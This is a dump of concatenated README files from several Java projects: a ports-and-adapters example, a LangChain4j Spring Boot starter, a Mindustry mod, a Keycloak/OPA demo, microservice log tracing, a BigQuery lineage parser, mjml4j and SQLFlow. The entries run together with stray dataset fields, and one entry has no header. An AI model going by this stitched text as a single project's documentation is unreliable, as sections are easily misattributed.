### [Share your thin ports and adapters in another language or framework here! üôå](https://github.com/aleixmorgadas/thin-ports-and-adapters/discussions/categories/thin-p-a-in-other-languages-and-frameworks)

This is an example of a Ports and Adapters (P&A for short) architecture in Java 21 and Spring Boot.

We can define a simple P&A architecture as follows:

```mermaid
graph LR
    RestControllerAdapter --> ApplicationService
    ApplicationService --> Entity
    Entity --> RepositoryPort
    RepositoryPort --> RepositorySQLAdapter
    subgraph Outside 
        RestControllerAdapter
        RepositorySQLAdapter
    end
    subgraph Inside 
        ApplicationService
        Entity
        RepositoryPort
    end
    
    PAdapter(Primary Adapter) -.-> RestControllerAdapter
    PPort(Primary Port) -.-> ApplicationService
    SAdapter(Secondary Adapter) -.-> RepositorySQLAdapter
    SPort(Secondary Port) -.-> RepositoryPort
```

![ports and adapters example](./.github/assets/hexagonal.svg)
[Reference](https://codesoapbox.dev/ports-adapters-aka-hexagonal-architecture-explained/)

A possible Spring Boot implementation of the adapters is:

```java
// RestControllerAdapter (Primary Adapter)
@RestController
class TeamController {
    private final TeamService teamService; // Primary Port
    
    @GetMapping(""/teams"")
    public List<TeamData> getTeams() {
        return teamService.getTeams();
    }
}

// TeamRepositoryPort (Secondary Port)
interface TeamRepository extends ListCrudRepository<Team, Long> {
}

// The SQL Adapter of the TeamRepositoryPort is provided by Spring Data JPA. It is the Secondary Adapter.
```

### Is it only this?

Yes, a ports and adapters architecture is only this.

Patterns like Domain Events, Aggregates, Value Objects, CQRS and Event Sourcing, all those patters go beyond the intention or responsibility of a ports and adapters architecture. Indeed, a P&A architecture works well with CRUD models (or models with not many domain logic) as well as Domain Models.

The beauty of it is that it adapts to each part of your business, and you can choose the right amount of abstraction/complexity for each scenario.

### And testing?

IMHO, this is where a P&A shines. It really helps you create a solid and adaptable test suite. Here a short example of test types.

**End-to-end tests**

- [TeamControllerE2ETest](src/test/java/dev/aleixmorgadas/thinportsandadapters/web/TeamControllerE2ETest.java)

**Integration test**

- HTTP adapter. [TeamControllerIntegrationTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/web/TeamControllerIntegrationTest.java)
- Service and SQL Repository. [TeamServiceIntegrationTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/domain/TeamServiceIntegrationTest.java)
- SQL Repository. [TeamRepositoryIntegrationTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/domain/TeamRepositoryIntegrationTest.java)

**Unit test**

- HTTP adapter. [TeamControllerUnitTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/web/TeamControllerUnitTest.java)
- Service. [TeamServiceTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/domain/TeamServiceTest.java)
- Domain. [TeamTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/domain/TeamTest.java)

## Running the application

```shell
./gradlew bootTestRun
```

‚ÑπÔ∏è It uses [Spring Boot integration][sbit] with Testcontainers to spin up a PostgreSQL container.

### Using the API

```shell
curl -X GET http://localhost:8080/teams
``` 

```shell
curl -X POST -H ""Content-Type: application/json"" -d '{""name"": ""Team 1""}' http://localhost:8080/teams
```

```shell
curl -X PATCH -H ""Content-Type: application/json"" -d '{""name"": ""Team 1""}' http://localhost:8080/teams/{id}/rename
```

## Running the tests

```shell
./gradlew test
```

You will see how the thin ports and adapters architecture allows us to test the application with multiple approaches:

- Unit tests for the domain logic.
- Integration tests for the application service.
- End-to-end tests for the REST API.

ThomasVitale/langchain4j-spring-boot,main,"# LangChain4j Spring Boot

This project brings [LangChain4j](https://github.com/langchain4j) support in Spring Boot
to build AI and LLM-powered applications. It provides integrations with LLM services
and vector stores, as well as tools, chains, and AI services.

Using the starter projects in this repository, you gain the following advantages over
using the vanilla LangChain4j libraries in Spring Boot:

* Autoconfiguration and unified configuration properties for models and vector stores
* HTTP infrastructure with RestClient, WebClient, and Jackson for all integrations
* Built-in observability with Micrometer, including LLM-specific metrics and traces
* Dev services with Docker Compose and Testcontainers for models and vector stores
* Service bindings for automatic connection configuration when running on Kubernetes.

## üöÄ&nbsp; Quick Start

### Pre-Requisites

* Java 17+
* Docker/Podman
* [Spring CLI](https://docs.spring.io/spring-cli/reference/installation.html)

### Getting Started

Using the Spring CLI, you can easily bootstrap a new Spring Boot application with LangChain4j support.

First, add the LangChain4j Spring Boot catalog providing the project templates.

```shell
spring project-catalog add langchain4j https://github.com/ThomasVitale/langchain4j-spring-boot
```

Then, create a new Spring Boot project for building an LLM Applications with LangChain4j and Ollama.

```shell
spring boot new myapp langchain4j-chat-ollama
```

Finally, navigate to the `myapp` folder and run the Spring Boot application. The first time you run it,
it will take a while to download the Ollama container image used as a dev service based on the Testcontainers
Spring Boot integration.

```shell
cd myapp
./mvnw spring-boot:run
```

You can now call the application that will use Ollama and _llama3_ to generate a text response.
This example uses [httpie](https://httpie.io) to send HTTP requests.

```shell
http :8080/ai/chat message==""What is the capital of Italy?""
```

MEEPofFaith/hallucinogen,master,"# Hallucinogen
A Java Mindustry mod that destroys your vision.

## Building for Desktop Testing

1. Install JDK **17**.
2. Run `gradlew jar` [1].
3. Your mod jar will be in the `build/libs` directory. **Only use this version for testing on desktop. It will not work with Android.**
To build an Android-compatible version, you need the Android SDK. You can either let Github Actions handle this, or set it up yourself. See steps below.

## Building through Github Actions

This repository is set up with Github Actions CI to automatically build the mod for you every commit. This requires a Github repository, for obvious reasons.
To get a jar file that works for every platform, do the following:
1. Make a Github repository with your mod name, and upload the contents of this repo to it. Perform any modifications necessary, then commit and push. 
2. Check the ""Actions"" tab on your repository page. Select the most recent commit in the list. If it completed successfully, there should be a download link under the ""Artifacts"" section. 
3. Click the download link (should be the name of your repo). This will download a **zipped jar** - **not** the jar file itself [2]! Unzip this file and import the jar contained within in Mindustry. This version should work both on Android and Desktop.

## Building Locally

Building locally takes more time to set up, but shouldn't be a problem if you've done Android development before.
1. Download the Android SDK, unzip it and set the `ANDROID_HOME` environment variable to its location.
2. Make sure you have API level 30 installed, as well as any recent version of build tools (e.g. 30.0.1)
3. Add a build-tools folder to your PATH. For example, if you have `30.0.1` installed, that would be `$ANDROID_HOME/build-tools/30.0.1`.
4. Run `gradlew deploy`. If you did everything correctlly, this will create a jar file in the `build/libs` directory that can be run on both Android and desktop. 

## Adding Dependencies

Please note that all dependencies on Mindustry, Arc or its submodules **must be declared as compileOnly in Gradle**. Never use `implementation` for core Mindustry or Arc dependencies. 

- `implementation` **places the entire dependency in the jar**, which is, in most mod dependencies, very undesirable. You do not want the entirety of the Mindustry API included with your mod.
- `compileOnly` means that the dependency is only around at compile time, and not included in the jar.

Only use `implementation` if you want to package another Java library *with your mod*, and that library is not present in Mindustry already.

*[1]* *On Linux/Mac it's `./gradlew`, but if you're using Linux I assume you know how to run executables properly anyway.*  
*[2]: Yes, I know this is stupid. It's a Github UI limitation - while the jar itself is uploaded unzipped, there is currently no way to download it as a single file.*

thomasdarimont/keycloak-opa-authz-demo,main,"Keycloak Open Policy Integration Demo
----

Example code for integrating Open Policy Agent with Keycloak presented at Keycloak Dev Day 2024.

[Slides](keycloak-devday-2024-flexible-authz-for-keycloak-with-openpolicyagent.pdf)

# Build

```
mvn clean package -DskipTests
```

# Run

## Run with HTTP

Start the docker compose setup with Keycloak, Open Policy Agent, Mail server.

```
docker compose -f dev/docker-compose.yml up
```

## Run with HTTPS

This example uses https://id.kubecon.test:8443/auth as the Keycloak auth server URL.

To use the example with https just add a mapping for `id.kubecon.test` to your `/etc/hosts` file
and regenerate the certificates via the [mkcert](https://github.com/FiloSottile/mkcert) tool first.

Then start the `dev/docker-compose-https.yml` docker compose file.

¬¥¬¥¬¥
(cd dev/config/certs && mkcert -install && mkcert -cert-file kubecon.pem -key-file kubecon-key.pem ""*.kubecon.test"")

docker compose -f dev/docker-compose-https.yml up
¬¥¬¥¬¥

# Demo

Once up, you can access Keycloak via http://localhost:8080/auth and login with `admin/admin`.

The demo contains a realm called `opademo` that is configured via `dev/config/realms/opademo.yaml`
through [keycloak-config-cli](https://github.com/adorsys/keycloak-config-cli).

## Users

The example contains a few users to demonstrate various aspects.

- Username: ""tester"" with Password: ""test""
- Username: ""admin"" with Password: ""test""
- Username: ""guest"" with Password: ""test""

## Clients

The `opademo` realm contains a few client applications to demonstrate various access policies expressed
with the REGO Policy language provided by OpenPolicyAgent. 

## OPA Access Policy

The client access policies are defined in the file `dev/opa/policies/keycloak/realms/opademo/access/policy.rego`. 
For this demo Open Policy Agent is configured to watch the file for changes and will automatically
update the policies on change.

To enable the policy check, go to `opademo Realm` -> `Authentication` -> `Required Actions` -> `Enable: OPA Policy Check`.

## Realm configuration

The realm with the clients, roles, groups and users are defined in the `dev/config/realms/opademo.yaml` 
config file. 

For the demo the `tester` user can be granted more access incrementally by uncommenting the role / group memeber ship mapping in the `opademo.yaml` file.

To apply the changed realm configuration to the running Keycloak instance, just execute the following command:

`docker restart dev-keycloak-provisioning-1`.",0,0,1,Apache-2.0,,1.0

## Architecture Diagram

![architecture](Images/arch.png)

## Running on Your Computer

Clone the project

```bash
https://github.com/ErayMert/microservice-log-tracing.git
```

Navigate to the project directory in the terminal

```bash
  cd microservice-log-tracing
```

* The docker-compose.yml file contains configurations for Kafka, Grafana, Zipkin, Zookeeper, Tempo, and Loki.

```yml
version: '3.8'

services:
  grafana:
    image: grafana/grafana-enterprise:latest
    volumes:
      - ./docker/grafana/datasources.yml:/etc/grafana/provisioning/datasources.yaml
    environment:
      - GF_AUTH_ANONYMOUS_ENABLED=true
      - GF_AUTH_ANONYMOUS_ORG_ROLE=Admin
      - GF_AUTH_DISABLE_LOGIN_FORM=true
    ports:
      - ""3000:3000""

  zipkin:
    image: openzipkin/zipkin:latest
    ports:
      - ""9411:9411""

  zookeeper:
    image: docker.io/bitnami/zookeeper:3.8
    restart: always
    hostname: zookeeper
    container_name: zookeeper
    ports:
      - ""2181:2181""
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181
      ZOOKEEPER_TICK_TIME: 2000
      ALLOW_ANONYMOUS_LOGIN: yes

  kafka:
    image: wurstmeister/kafka
    container_name: kafka
    ports:

    environment:
      KAFKA_ADVERTISED_HOST_NAME: localhost
      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181

  loki:
    image: grafana/loki:main
    command: [ ""-config.file=/etc/loki/local-config.yaml"" ]
    ports:
      - ""3100:3100""

  tempo:
    image: grafana/tempo:2.2.4
    command: [ ""--target=all"", ""--storage.trace.backend=local"", ""--storage.trace.local.path=/var/tempo"", ""--auth.enabled=false"" ]
    ports:
      - ""14250:14250""
      - ""4317:4317""
    depends_on:
      - loki
```

You can start these tools with the following command:

```docker
  docker-compose up -d
```

## Added Libraries

* Brave is a library that enables tracing in distributed systems. Especially useful in complex systems like microservices architectures, it tracks requests passing through gateways, allowing you to see how requests interact with each other and how they are responded to.

```xml
<dependency>
    <groupId>io.micrometer</groupId>
    <artifactId>micrometer-tracing-bridge-brave</artifactId>
</dependency>
```

* This dependency allows for the collection of metrics and monitoring via Micrometer in applications using OpenFeign.

```xml
<dependency>
    <groupId>io.github.openfeign</groupId>
    <artifactId>feign-micrometer</artifactId>
</dependency>
```

* Zipkin is a tracing system and server that provides tracing and debugging capabilities in distributed systems. The zipkin-reporter-brave dependency provides the necessary reporter functionality to send reports to Zipkin via the Brave library, enabling tracing in your application through Zipkin.

```xml
<dependency>
    <groupId>io.zipkin.reporter2</groupId>
    <artifactId>zipkin-reporter-brave</artifactId>
</dependency>
```
* Developed by Grafana Labs. The loki-logback-appender dependency allows for redirecting log messages from Logback to Loki. This enables storing your application's logs in Loki and visualizing them with Grafana.

```xml
<dependency>
    <groupId>com.github.loki4j</groupId>
    <artifactId>loki-logback-appender</artifactId>
    <version>1.3.2</version>
</dependency>
```

## Logback-spring.xml File

* I configured the file as below since I'm tracing logs in Loki datasource in Grafana. This file should be present in every project.
* The label sections correspond to the parts used for searching in Loki.

```xml
<?xml version=""1.0"" encoding=""UTF-8""?>
<configuration>
    <include resource=""org/springframework/boot/logging/logback/base.xml""/>
    <springProperty scope=""context"" name=""appName"" source=""spring.application.name""/>

    <appender name=""LOKI"" class=""com.github.loki4j.logback.Loki4jAppender"">
        <http>
            <url>http://localhost:3100/loki/api/v1/push</url>
        </http>
        <format>
            <label>
                <pattern>app=${appName},host=${HOSTNAME},traceID=%X{traceId:-NONE},level=%level</pattern>
            </label>
            <message>
                <pattern>${FILE_LOG_PATTERN}</pattern>
            </message>
            <sortByTime>true</sortByTime>
        </format>
    </appender>

    <root level=""INFO"">
        <appender-ref ref=""LOKI""/>
    </root>

</configuration>
```

## Configuration in application.yml

* The following setting indicates that all tracing data will be collected. That is, each request is traced and stored with a 100% probability.
``` yml
management:
  tracing:
    sampling:
      probability: 1.0
```
* This setting provides Zipkin configuration and allows Spring Boot 3 to connect to a remote server.
* By default `http://localhost:9411/api/v2/spans`, we don't need to specify the endpoint, but we need to for a standalone server.

``` yml
management:
  zipkin:
    tracing:
      endpoint: ""http://localhost:9411/api/v2/spans""
```
* The following config specifies how the traceId and spanId will be reflected in the output.

``` yml
logging:
  pattern:
    level: ""%5p [${spring.application.name:},%X{traceId:-},%X{spanId:-}]""
```

* The output in the console looks like this: 

![trace_span](Images/trace_span.png)

## Micrometer for Schedule

* You must use version of spring boot above 3.2.0
> https://github.com/spring-projects/spring-boot/issues/36119


## Micrometer Configuration for Kafka

* For the Producer: 
    * Set `kafkaTemplate.setMicrometerEnabled(true);`
    * Set `kafkaTemplate.setObservationEnabled(true);`
  
```java
@RequiredArgsConstructor
@Configuration
public class ProducerConfiguration {

    private final KafkaProperties kafkaProperties;

    @Bean
    public ProducerFactory<String, Object> producerFactory() {
        Map<String, Object> configProps = new HashMap<>();
        configProps.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaProperties.getAddress());
        configProps.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class);
        configProps.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, JsonSerializer.class);
        
        return new DefaultKafkaProducerFactory<>(configProps);
    }

    @Bean
    public KafkaTemplate<String, Object> kafkaTemplate() {

        KafkaTemplate<String, Object> kafkaTemplate = new KafkaTemplate<>(producerFactory());
        kafkaTemplate.setMicrometerEnabled(true);
        kafkaTemplate.setObservationEnabled(true);

        return kafkaTemplate;
    }
}
```

* For the Consumer:
    * Set `factory.getContainerProperties().setObservationEnabled(true);`
    * Set `factory.getContainerProperties().setMicrometerEnabled(true);`
    * Set `factory.getContainerProperties().setLogContainerConfig(true);` // Not required
    * Set `factory.getContainerProperties().setCommitLogLevel(LogIfLevelEnabled.Level.INFO);`  // Not required

```java
@Slf4j
@RequiredArgsConstructor
@Configuration
public class KafkaConsumerConfiguration {

    private final KafkaProperties kafkaProperties;

    @Bean
    public KafkaListenerContainerFactory<ConcurrentMessageListenerContainer<String, Object>> kafkaListenerContainerFactory() {
        ConcurrentKafkaListenerContainerFactory<String, Object> factory =
                new ConcurrentKafkaListenerContainerFactory<>();

        factory.getContainerProperties().setObservationEnabled(true);
        factory.getContainerProperties().setMicrometerEnabled(true);
        factory.getContainerProperties().setLogContainerConfig(true); 
        factory.getContainerProperties().setCommitLogLevel(LogIfLevelEnabled.Level.INFO);
        factory.setConsumerFactory(new DefaultKafkaConsumerFactory<>(consumerConfigs()));
        return factory;
    }

    @Bean
    public Map<String, Object> consumerConfigs() {
        Map<String, Object> props = new HashMap<>();
        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaProperties.getAddress());
        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);
        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);
        props.put(ConsumerConfig.GROUP_ID_CONFIG, kafkaProperties.getGroupId());
        props.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, ""latest"");
        props.put(JsonDeserializer.TRUSTED_PACKAGES, ""*"");
        return props;
    }

}
```

## Micrometer Configuration for Async

* By design you can only have one AsyncConfigurer, thus only one executor pool is

```java
import io.micrometer.context.ContextExecutorService;
import io.micrometer.context.ContextSnapshot;
import java.util.concurrent.Executor;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.annotation.AsyncConfigurer;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;

@Configuration(proxyBeanMethods = false)
@RequiredArgsConstructor
public class AsyncTraceContextConfig implements AsyncConfigurer {

  // NOTE: By design you can only have one AsyncConfigurer, thus only one executor pool is
  // configurable.
  @Qualifier(""taskExecutor"") // if you have more than one task executor pools
  private final ThreadPoolTaskExecutor taskExecutor;

  @Override
  public Executor getAsyncExecutor() {
    return ContextExecutorService.wrap(
            taskExecutor.getThreadPoolExecutor(),
                    ContextSnapshotFactory.builder().build()::captureAll);
  }
}
```
* If you have more than one executor pools and wants to add tracing to all, use the TaskDecorator with ContextSnapshot.wrap():

```java
import io.micrometer.context.ContextSnapshot;
import java.util.concurrent.Executor;
import org.springframework.boot.task.TaskExecutorBuilder;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.task.TaskDecorator;

@Configuration
public class AsyncConfig {
  @Bean
  public TaskDecorator otelTaskDecorator() {
    return runnable -> ContextSnapshotFactory.builder().build()
                                      .captureAll((new Object[0])).wrap(runnable);
  }

  @Bean(""asyncExecutorPool1"")
  public Executor asyncExecutorPool1(TaskDecorator otelTaskDecorator) {
    return new TaskExecutorBuilder()
        .corePoolSize(5)
        .maxPoolSize(10)
        .queueCapacity(10)
        .threadNamePrefix(""threadPoolExecutor1-"")
        .taskDecorator(otelTaskDecorator)
        .build();
  }

  @Bean(""asyncExecutorPool2"")
  public Executor asyncExecutorPool2(TaskDecorator otelTaskDecorator) {
    return new TaskExecutorBuilder()
        .corePoolSize(5)
        .maxPoolSize(10)
        .queueCapacity(10)
        .threadNamePrefix(""threadPoolExecutor2-"")
        .taskDecorator(otelTaskDecorator)
        .build();
  }
}
```
## Trying it out on the Application

* First, let's create a customer and a product using Swagger.

![create_customer](Images/create_customer.png)
![create_product](Images/product_create.png)

* Then, the customer will create an order, and the customer service will communicate with the order service via Kafka to create an order.
![create_order](Images/create_order.png)

### Log Tracing with Grafana

* Connect to Grafana using the address <http://localhost:3000>
* The configuration of logback-spring.xml on Loki datasource in Grafana looks like this:

![loki label](Images/loki_label.png)

* Let's observe the order creation we tried above on Grafana.
  * First, we'll obtain a traceId from the customer service, and then we'll search on Loki using this traceId to observe all logs associated with this traceId.

![create_order_log](Images/create_order_log.png)
  * Let's search with the traceId we obtained, and we'll see all service logs associated with this traceId.

![create_order_trace_log](Images/grafana_trace_log.png)

### Log Tracing with Zipkin
* To connect to Zipkin, use the address <http://localhost:9411>

* If we observe the order creation request on Zipkin, we'll see output like this:

![zipkin_trace_log](Images/zipkin_trace_log.png)


### Happy coding, and may your microservices journey be filled with successful deployments and seamless operations!""

borjavb/bq-lineage-tool,master,"# Bq-Lineage-tool


Bq-lineage tool is a column level lineage parser for BigQuery using ZetaSQL. This 
parser started as a fork of this [project by google](https://github.com/GoogleCloudPlatform/bigquery-data-lineage), but it
has been heavily modified to cover the whole bigquery syntax offered by ZetaSQL. The
output of this parser is a DAG of the columns used in a query from sources to outputs, including
auxiliary fields that could be used as part of filters or other operations that don't result in the
materialisation of a field. 



From any arbitrary BigQuery query, you will get the following outputs:
- `output_columns`: The columns that are part of the output of the query, with all the input 
  columns references that were needed to produce them.
- `joins`: List of joins used in the query, considering the columns used for the join
- `aggregations`: List of columns used for aggregations
- `filters`: List of columns used for filtering
- `other_used_columns`: Any other columns used across the query, like order by
- `selected_tables`: A list of all the tables that were selected in the query.
- `Type`: The type of sql statement `{SELECT, CREATE_VIEW, MERGE...}`

![image](./flow.png)


## What can this parser do?

* It's schema aware. This means that a query like `SELECT * FROM table` will generate a DAG
  with all the output columns of `table`, and not just a single node with a `*` symbol.
* It prunes unused columns. This means that for a query like `WITH base AS (SELECT * FROM
  table) SELECT aColumn FROM base` the output DAG will only contain the column `aColumn` and not the
  whole input table.
* It covers pretty much all the BigQuery syntax, including:
    * `WITH` (CTE) clauses
    * Subqueries
    * `UNNEST`-based `JOINS`
    * `STRUCTS` and `ARRAYS`
    * `JOINS`
    * Analytical functions (`QUALIFY`, `LAG`/`LEAD`, `WINDOWS` etc.)
    * Map aliases to original columns
    * `JSON` functions
    * Access to the `PATH` used in `JSON` functions (`JSON_EXTRACT(field,""$.path.to.field"")`)
    * Access to the literals used in the query, for example, in a `WHERE` clause
    * Access to fields that are not part of the output columns of the table (fields only used in a
      `WHERE` clause)
    * `PIVOT` and `UNPIVOT` transformations
    * `GROUP BY GROUPING SETS`, `ROLLUP` and `CUBE`
    * `UDF` and temporary functions
    * Usage of parameters @param
    * Recursive CTEs
    * It parses `SELECTS`, `CREATE {VIEWS}` and `MERGE` statements
    * It automatically infers internal BQ fields like `_TABLE_SUFFIX`

## What can't it do?

* This parser won't work with procedural SQL. For example, it will fail trying to parse a 
  DECLARE or SET operations.
* This parser won't read the logic within UDF functions. It only checks inputs and outputs.
* ZetaSQL might not be up-to-date with the latest BigQuery features, so if there's something
  super new, it will involve either waiting for ZetaSQL to be updated, or going deep into
  ZetaSQL to build the feature.
* It doesn't work while trying to parse queries accessing `INFORMATION_SCHEMA`-type of tables. I
  guess we could bypass this by using a different type of access, but never when through it deeply.
* This parser won't build the DAG of multiple queries. It only parses a single query at a
  time. To build a full dag of your dbt project, for example, you can use libraries like
  `networkx` to connect the edges from the output of this parser.
* Parse SQL syntax that is not supported by ZetaSQL (for example the + operator in Snowflake joins)
* When doing a `SELECT count(*) FROM table`, the output of the parser would act as if no columns
  were selected. This could be subject to interpretation: should all the columns of the input
  `table` be marked as used? Or should the output be an empty list because this query doesn't
  care about any specific column or number of columns?
* Unexpected bugs - even though this parser has been texted over more than 7000 SQL queries, 
  there still might be some edge cases that suddenly are not covered. SQL is hard.
* It doesn't work with `TVF` (Table Valued Functions) - although ZetaSQL parses it, the output 
  won't show the columns of the TVF.
* Automatically infer UDFs - they have to be defined as part of the script that is going to be parsed.

## How to use
The folder `/src/test/examples` has multiple examples of how to use this parser. The main caveat 
relies on how to build the catalog that ZetaSQL needs. Depending on how much you want the parser 
to automate the whole process for you, there are three different methods to build a catalog, 
from the ""let the parser to it for me"" to ""I'll build the catalog myself""

- `/src/test/examples/BigQuerySqlParserBQSchemaTest.java` shows how to rely on the metadata of 
  BiGQuery to build the catalog. To use this method the user has to be authenticated with gcloud.
  Note that there's zero data access/movement in this operation. The only access that is being 
  done is directly to the metadata of the tables, and only to the tables that are being used in 
  the parsed query, i.e., this parser won't scan the whole database. The access is done using 
  the bigquery API. You can use  `gcloud auth application-default login` to authenticate. 
- `/src/test/examples/BigQuerySqlParserLocalSchemaTest.java` shows how to use local json files 
  to build the schema. `/src/test/resources/schemas/` has examples of these files. They are 
  exact copies of the metadata information you can get 
[through the API](https://cloud.google.com/bigquery/docs/reference/rest/v2/tables). Note that 
  this is basically what we automate with the previous method.
- `/src/test/examples/ASTExplorerTest.java` Shows an example on how can manually create your own 
  catalog using ZetaSQL methods/constructors and feed it into the parser. 

### Example
The following example uses the first method to build the catalog -  it will use the bigquery API 
to request the metadata of the tables used in the query.
```java
    BigQueryZetaSqlSchemaLoader schemaLoader =
        new BigQueryZetaSqlSchemaLoader(
            BigQueryTableLoadService.usingServiceFactory(
                BigQueryServiceFactory.defaultFactory()
          )
        );

    ZetaSQLResolver parser = new ZetaSQLResolver(schemaLoader);
    
    String sql = """"""
        SELECT
              word,
              SUM(word_count) AS count
            FROM
              `bigquery-public-data.samples.shakespeare`
            WHERE
              word LIKE ""%raisin%""
            GROUP BY
              word;
        """""";
    
    ResolvedNodeExtended table = parser.extractLineage(sql);
    OutputLineage printer = new OutputLineage();
    printer.toYaml(table, ""test"", true);
```
Output:
```
name: ""test""
output_columns:
- name: ""word""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
- name: ""count""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word_count""
other_used_columns:
- name: ""_word_""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
    literal_value:
    - ""%raisin%""
type: ""select""
selected_tables:
- ""bigquery-public-data.samples.shakespeare""
```

### Notes
- This parser **never** accesses the data of the tables or any bigquery instance. The only 
  connection needed is to the metadata of the tables.
- The parser will use a default project+dataset if these are missing in the reference tables of 
  a project. Please refer to `src/main/java/com/borjav/data/options/Options.java` in case you 
  need to set a specific project.
- When using UDFs, they also have to be defined within the code. The parser won't be able to 
  resolve them if they are not defined in the code. Please refer to 
  `src/test/resources/sql/benchmark/udf.yaml`.

digitalfondue/mjml4j,main,"# MJML4J

A java based [mjml](https://mjml.io/) implementation.

Require at least java 17.

Javadoc: https://javadoc.io/doc/ch.digitalfondue.mjml4j/mjml4j

# Why

As far as I know, there is no pure java porting of mjml. This library is quite compact (~150Kb) with a single dependency - the [html5 parser (jfiveparse)](https://github.com/digitalfondue/jfiveparse) (~153kb).

# License

mjml4j is licensed under the MIT License.

The code is based on the following projects:

 - https://github.com/mjmlio/mjml/
 - https://github.com/SebastianStehle/mjml-net
 - https://github.com/LiamRiddell/MJML.NET

# Status

Most of the mj-* tags are supported. It's currently missing:

 - ~~mj-include: will be implemented~~ implemented in 1.1.1
 - mj-style: the inline attribute will be ignored 
 - mj-html-attributes: will not be supported, as it requires a css selector

Additionally, no pretty print/minimization of the output is provided.

# Download

maven:

```xml
<dependency>
   <groupId>ch.digitalfondue.mjml4j</groupId>
   <artifactId>mjml4j</artifactId>
   <version>1.1.1</version>
</dependency>
```

gradle:

```
implementation 'ch.digitalfondue.mjml4j:mjml4j:1.1.1'
```

# Use

If you use it as a module, remember to add `requires ch.digitalfondue.mjml4j;` in your module-info.

The api is quite simple:

```java
package ch.digitalfondue.test;

import ch.digitalfondue.mjml4j.Mjml4j;

public class App {
   public static void main(String[] args) {
      var configuration = new Mjml4j.Configuration(""en"");
      var renderedTemplate = Mjml4j.render(""""""
              <mjml>
                <mj-body>
                  <mj-section>
                    <mj-column>
                                      
                      <mj-image width=""100px"" src=""/assets/img/logo-small.png""></mj-image>
                                      
                      <mj-divider border-color=""#F45E43""></mj-divider>
                                      
                      <mj-text font-size=""20px"" color=""#F45E43"" font-family=""helvetica"">Hello World</mj-text>
                                      
                    </mj-column>
                  </mj-section>
                </mj-body>
              </mjml>
              """""", configuration);
      System.out.println(renderedTemplate);
   }
}
```

The `render` static method accept as a parameters:
1) a string which will be then parsed and processed by the [html5 parser (jfiveparse)](https://github.com/digitalfondue/jfiveparse), or it can accept a `org.w3c.dom.Document` 
2) a configuration object with language, optionally a direction and an [IncludeResolver](https://javadoc.io/doc/ch.digitalfondue.mjml4j/mjml4j/latest/ch.digitalfondue.mjml4j/ch/digitalfondue/mjml4j/Mjml4j.IncludeResolver.html)


## mj-include support

By default, mjml4j don't have an [IncludeResolver](https://javadoc.io/doc/ch.digitalfondue.mjml4j/mjml4j/latest/ch.digitalfondue.mjml4j/ch/digitalfondue/mjml4j/Mjml4j.IncludeResolver.html) configured, thus `mj-include` will not work out of the box, you must implement or specify yourself.
mjml4j offer 2 implementations:
 - [FileSystemResolver](https://javadoc.io/doc/ch.digitalfondue.mjml4j/mjml4j/latest/ch.digitalfondue.mjml4j/ch/digitalfondue/mjml4j/Mjml4j.FileSystemResolver.html) if your resources are present on the filesystem
 - [SimpleResourceResolver](https://javadoc.io/doc/ch.digitalfondue.mjml4j/mjml4j/latest/ch.digitalfondue.mjml4j/ch/digitalfondue/mjml4j/Mjml4j.SimpleResourceResolver.html) a resolver that need a [ResourceLoader](https://javadoc.io/doc/ch.digitalfondue.mjml4j/mjml4j/latest/ch.digitalfondue.mjml4j/ch/digitalfondue/mjml4j/Mjml4j.ResourceLoader.html) to be implemented


# TODO:
 - ~~mj-include~~ implemented in 1.1.1
 - check https://github.com/mjmlio/mjml/compare/v4.14.1...v4.15.3 , printing especially
 - validation api:
   - add ""parent element"" check
   - attribute unit type check
 - improve the renderer
 - cleanup/rewrite the box model, kinda hacky
 - more robust handling of invalid input (check mjml behaviour)

sqlparser/java_data_lineage,main,"## Gudu SQLFlow Lite version for Java

[Gudu SQLFlow](https://sqlflow.gudusoft.com)  is a tool used to analyze SQL statements and stored procedures 
of various databases to obtain complex [data lineage](https://en.wikipedia.org/wiki/Data_lineage) relationships and visualize them.

[Gudu SQLFlow Lite version for Java](https://github.com/sqlparser/java_data_lineage) allows Java developers to quickly integrate data lineage analysis and 
visualization capabilities into their own Java applications. It can also be used in daily work by data scientists to quickly discover 
data lineage from complex SQL scripts that usually used in ETL jobs do the data transform in a huge data platform. 

Gudu SQLFlow Lite version for Java is free for non-commercial use and can handle any complex SQL statements 
with a length of up to 10k, including support for stored procedures. It supports SQL dialect from more than 
20 major database vendors such as Oracle, DB2, Snowflake, Redshift, Postgres and so on.

Gudu SQLFlow Lite version for Java includes [a Java library](https://www.gudusoft.com/sqlflow-java-library-2/) for analyzing complex SQL statements and 
stored procedures to retrieve data lineage relationships, and [a JavaScript library](https://docs.gudusoft.com/4.-sqlflow-widget/get-started) for visualizing data lineage relationships.

Gudu SQLFlow Lite version for Java can also automatically extract table and column constraints, 
